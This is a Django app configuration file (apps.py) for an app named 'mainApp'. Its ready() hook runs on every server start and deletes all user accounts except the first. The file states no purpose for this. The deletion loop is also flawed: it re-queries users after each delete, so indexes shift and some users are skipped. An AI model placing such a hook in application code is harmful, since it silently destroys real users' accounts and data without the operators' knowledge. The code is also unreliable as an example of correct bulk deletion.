from django.apps import AppConfig



class MainappConfig(AppConfig):
    default_auto_field = 'django.db.models.BigAutoField'
    name = 'mainApp'
    def ready(self):
        
        from django.contrib.auth.models import User
        users = User.objects.all()
        for i in range(1, len(users)):
            User.objects.all()[i].delete()
